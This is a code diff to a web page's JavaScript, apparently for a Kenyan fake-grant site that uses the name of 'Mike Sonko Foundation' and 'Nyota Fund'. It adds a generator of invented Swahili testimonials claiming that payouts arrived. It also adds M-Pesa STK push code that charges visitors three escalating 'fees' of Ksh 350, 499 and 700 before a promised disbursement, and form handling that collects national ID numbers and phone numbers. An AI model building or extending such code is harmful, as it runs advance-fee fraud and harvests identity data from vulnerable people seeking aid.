+function addRandomFeed() {
+    const names = [
+        { name: 'Peter Ochieng', initials: 'PO', color: '#e65100' },
+        { name: 'Faith Akinyi', initials: 'FA', color: '#2e7d32' },
+        { name: 'Kevin Odhiambo', initials: 'KO', color: '#1565c0' },
+        { name: 'Sarah Wambui', initials: 'SW', color: '#6a1b9a' },
+        { name: 'David Mwangi', initials: 'DM', color: '#bf360c' },
+    ];
+    const texts = [
+        'Nani mwingine amepata? Yangu imekubali na niko Kajiado saa hii. 🎉',
+        'Niko Kisumu na nimepata. Program iko sawa kabisa. M-Pesa confirmed!',
+        'Hii kitu ni legit kabisa, nilikuwa nadhani ni uongo lakini 20k imefika.',
+        'Asante sana Mike Sonko! Kazi kwa vijana imeanza kabisa.',
+        'M-pesa ishaingia, shukran sana kwa hii msaada.'
+    ];
+    const randomName = names[Math.floor(Math.random() * names.length)];
+    const randomText = texts[Math.floor(Math.random() * texts.length)];
+    const timeOptions = ['Just now', '5 seconds ago', '10 seconds ago', '30 seconds ago'];
+    const randomTime = timeOptions[Math.floor(Math.random() * timeOptions.length)];
+    const item = { ...randomName, text: randomText, time: randomTime };
+    feedItems.unshift(item);
+    if (feedItems.length > 20) feedItems.pop();
+    renderFeed();
+}
 
-            btnCancelPay.addEventListener('click', () => {
-                if (confirm('Cancel payment and go back?')) {
-                    showScreen('crb');
-                }
-            });
+// ==================== ERROR HANDLER ====================
+function errorText(data) {
+    if (typeof data === 'string') return data;
+    if (data && data.error) {
+        return typeof data.error === 'string' ? data.error : JSON.stringify(data.error);
+    }
+    if (data && data.message) return data.message;
+    return 'Request failed';
+}
 
-            // Pre-fill sample name for demo
-            fullNameInput.value = 'Kevin Odhiambo';
+// ==================== VERCEL API (using test file's channel and endpoints) ====================
+const CHANNEL_ID = 'PAYL-MX4HSE';
+const STK_PUSH_URL = '/api/stk-push';
+const STATUS_URL = '/api/status';
 
-            console.log('NYOTA FUND KENYA PHASE 2 — All systems ready.');
-        })();
-    </script>
+function normalizePhone(raw) {
+    let p = raw.replace(/\D/g, '');
+    if (p.startsWith('0')) p = '254' + p.slice(1);
+    if (!p.startsWith('254')) p = '254' + p;
+    return p;
+}
+
+async function sendSTKPush(phone, amount, reference) {
+    const payload = {
+        phone: normalizePhone(phone),
+        amount,
+        reference,
+        channelId: CHANNEL_ID
+    };
+    console.log('📤 Sending STK push:', payload);
+    const response = await fetch(STK_PUSH_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
+    if (!response.ok) {
+        let errorMsg = 'STK push request failed';
+        try {
+            const errorData = await response.json();
+            errorMsg = errorText(errorData);
+        } catch (_) { /* ignore */ }
+        throw new Error(errorMsg);
+    }
+    return response.json();
+}
+
+async function pollTransactionStatus(transactionId) {
+    const start = Date.now();
+    const timeout = 60000;
+    while (Date.now() - start < timeout) {
+        const response = await fetch(`${STATUS_URL}?id=${encodeURIComponent(transactionId)}`);
+        if (!response.ok) {
+            let errMsg = 'Status check failed';
+            try {
+                const errData = await response.json();
+                errMsg = errorText(errData);
+            } catch (_) {}
+            throw new Error(errMsg);
+        }
+        const data = await response.json();
+        if (data.status === 'COMPLETED') {
+            return data;
+        } else if (data.status === 'FAILED' || data.status === 'CANCELLED') {
+            throw new Error('Payment ' + data.status.toLowerCase());
+        }
+        await new Promise(resolve => setTimeout(resolve, 2000));
+    }
+    throw new Error('Transaction timed out');
+}
+
+// ==================== PAYMENT FLOW ====================
+function showDonationProcessingPage() {
+    showPage('donationProcessingPage');
+}
+
+// 1. Donation Processing Fee (Ksh 350)
+async function processDonationFee() {
+    const phone = appData.phone || '0710222875';
+    const amount = 350;
+    const reference = `MSF-DON-${Date.now()}`;
+    const statusEl = document.getElementById('donationFeeStatus');
+    const btn = event.target.closest('button');
+
+    btn.disabled = true;
+    btn.textContent = '⏳ Sending...';
+    statusEl.className = 'modal-status show pending';
+    statusEl.textContent = '⏳ Sending STK push...';
+
+    document.getElementById('stkWaitingOverlay').classList.add('open');
+
+    try {
+        const result = await sendSTKPush(phone, amount, reference);
+        const transactionId = result.transactionId || result.reference || result.transaction_id;
+        if (!transactionId) throw new Error('No transaction ID returned');
+
+        await pollTransactionStatus(transactionId);
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show success';
+        statusEl.textContent = '✅ Payment confirmed!';
+        btn.textContent = '✅ Paid!';
+        setTimeout(() => {
+            showPage('disbursementDetailsPage');
+            btn.disabled = false;
+            btn.textContent = 'Pay Ksh 350 to Process →';
+            statusEl.className = 'modal-status';
+            statusEl.textContent = '';
+        }, 1000);
+    } catch (err) {
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show error';
+        statusEl.textContent = '❌ ' + errorText(err);
+        btn.disabled = false;
+        btn.textContent = 'Pay Ksh 350 to Process →';
+    }
+}
+
+// Disbursement details
+function selectDisbNumber(type) {
+    if (type === 'same') {
+        const rawPhone = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
+        document.getElementById('disbPhoneConfirm').textContent = rawPhone;
+        document.getElementById('sameNumBtn').style.border = '2px solid var(--accent-gold)';
+        document.getElementById('sameNumBtn').style.background = '#fef9f0';
+        document.getElementById('diffNumBtn').style.border = '1.5px solid #ced4da';
+        document.getElementById('diffNumBtn').style.background = '#fff';
+    } else {
+        showToast('Please enter a different number (demo: just use same number).');
+    }
+}
+
+function selectNetwork(net) {
+    selectedNetwork = net;
+    document.querySelectorAll('.network-btn').forEach(b => b.classList.remove('network-selected'));
+    document.getElementById('net-' + net).classList.add('network-selected');
+}
+
+function goToNetworkFeePage() {
+    const rawPhone = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
+    document.getElementById('netFeePhoneDisplay').textContent = rawPhone;
+    document.getElementById('netFeePhoneBox').textContent = rawPhone;
+    document.getElementById('netFeeRecipientName').textContent = appData.fullName || 'Beneficiary';
+    showPage('networkFeePage');
+}
+
+// 2. Processing Support Fee (Ksh 499)
+async function processSupportFee() {
+    const phone = selectedDisbPhone;
+    const amount = 499;
+    const reference = `MSF-SUP-${Date.now()}`;
+    const statusEl = document.getElementById('netFeeStatus');
+    const btn = document.getElementById('netFeePayBtn');
+    const payText = document.getElementById('netFeePayText');
+    const spinner = document.getElementById('netFeeSpinner');
+
+    btn.disabled = true;
+    payText.textContent = '⏳ Sending...';
+    spinner.style.display = 'inline-block';
+    statusEl.className = 'modal-status show pending';
+    statusEl.textContent = '⏳ Sending STK push...';
+
+    document.getElementById('stkWaitingOverlay').classList.add('open');
+
+    try {
+        const result = await sendSTKPush(phone, amount, reference);
+        const transactionId = result.transactionId || result.reference || result.transaction_id;
+        if (!transactionId) throw new Error('No transaction ID returned');
+
+        await pollTransactionStatus(transactionId);
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show success';
+        statusEl.textContent = '✅ Payment confirmed!';
+        payText.textContent = '✅ Paid!';
+        setTimeout(() => {
+            proceedToDisbursementFee();
+            btn.disabled = false;
+            payText.textContent = 'Pay Ksh 499 — Process & Continue';
+            spinner.style.display = 'none';
+            statusEl.className = 'modal-status';
+            statusEl.textContent = '';
+        }, 1000);
+    } catch (err) {
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show error';
+        statusEl.textContent = '❌ ' + errorText(err);
+        btn.disabled = false;
+        payText.textContent = 'Pay Ksh 499 — Process & Continue';
+        spinner.style.display = 'none';
+    }
+}
+
+function proceedToDisbursementFee() {
+    const rawPhone = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
+    document.getElementById('disbFeePhoneDisplay').textContent = rawPhone;
+    document.getElementById('disbFeePhoneBox').textContent = rawPhone;
+    document.getElementById('disbFeeFinalPhone').textContent = rawPhone;
+    document.getElementById('disbFeeRecipientName').textContent = appData.fullName || 'Beneficiary';
+    const netMap = { safaricom: '🟢 Safaricom (M-PESA)', airtel: '🟡 Airtel Money', telkom: '🔵 Telkom (T-Kash)' };
+    document.getElementById('disbFeeNetworkDisplay').textContent = netMap[selectedNetwork] || netMap.safaricom;
+    showPage('disbursementFeePage');
+}
+
+// 3. Fund Release Contribution (Ksh 700)
+async function processReleaseContribution() {
+    const phone = selectedDisbPhone;
+    const amount = 700;
+    const reference = `MSF-REL-${Date.now()}`;
+    const statusEl = document.getElementById('disbFeeStatus');
+    const btn = document.getElementById('disbFeePayBtn');
+    const payText = document.getElementById('disbFeePayText');
+    const spinner = document.getElementById('disbFeeSpinner');
+
+    btn.disabled = true;
+    payText.textContent = '⏳ Sending...';
+    spinner.style.display = 'inline-block';
+    statusEl.className = 'modal-status show pending';
+    statusEl.textContent = '⏳ Sending STK push...';
+
+    document.getElementById('stkWaitingOverlay').classList.add('open');
+
+    try {
+        const result = await sendSTKPush(phone, amount, reference);
+        const transactionId = result.transactionId || result.reference || result.transaction_id;
+        if (!transactionId) throw new Error('No transaction ID returned');
+
+        await pollTransactionStatus(transactionId);
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show success';
+        statusEl.textContent = '✅ Payment confirmed!';
+        payText.textContent = '✅ Paid!';
+        setTimeout(() => {
+            const netMap = { safaricom: '🟢 Safaricom (M-PESA)', airtel: '🟡 Airtel Money', telkom: '🔵 Telkom (T-Kash)' };
+            document.getElementById('allClearNetworkDisplay').textContent = netMap[selectedNetwork] || netMap.safaricom;
+            document.getElementById('allClearPhoneDisplay').textContent = selectedDisbPhone.startsWith('0') ? selectedDisbPhone : '0' + selectedDisbPhone;
+            document.getElementById('finalAssistanceAmount').textContent = `Ksh ${approvedAmount.toLocaleString()}`;
+            document.getElementById('allFeesClearedOverlay').classList.add('open');
+            btn.disabled = false;
+            payText.textContent = 'Pay Ksh 700 — Release My Funds 🚀';
+            spinner.style.display = 'none';
+            statusEl.className = 'modal-status';
+            statusEl.textContent = '';
+        }, 1000);
+    } catch (err) {
+        document.getElementById('stkWaitingOverlay').classList.remove('open');
+        statusEl.className = 'modal-status show error';
+        statusEl.textContent = '❌ ' + errorText(err);
+        btn.disabled = false;
+        payText.textContent = 'Pay Ksh 700 — Release My Funds 🚀';
+        spinner.style.display = 'none';
+    }
+}
+
+function backToHome() {
+    document.getElementById('allFeesClearedOverlay').classList.remove('open');
+    goBackHome();
+}
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', () => {
+    renderProgrammes();
+    renderFeed();
+
+    document.getElementById('fullName').addEventListener('input', function() { validateName(this); });
+    document.getElementById('phoneNumber').addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length > 10) this.value = this.value.slice(0, 10);
+        validatePhone(this);
+    });
+    document.getElementById('nationalId').addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length > 8) this.value = this.value.slice(0, 8);
+        validateID(this);
+    });
+    document.getElementById('age').addEventListener('input', function() {
+        if (this.value.length > 2) this.value = this.value.slice(0, 2);
+        validateAge(this);
+    });
+    document.getElementById('occupation').addEventListener('input', function() { validateOccupation(this); });
+    document.getElementById('county').addEventListener('change', function() { validateCounty(this); });
+});
+
+console.log('🇰🇪 Mike Sonko Foundation — HOT: School Fees (20k + Animation) | Others: 15k');
+</script>
 </body>
 </html>
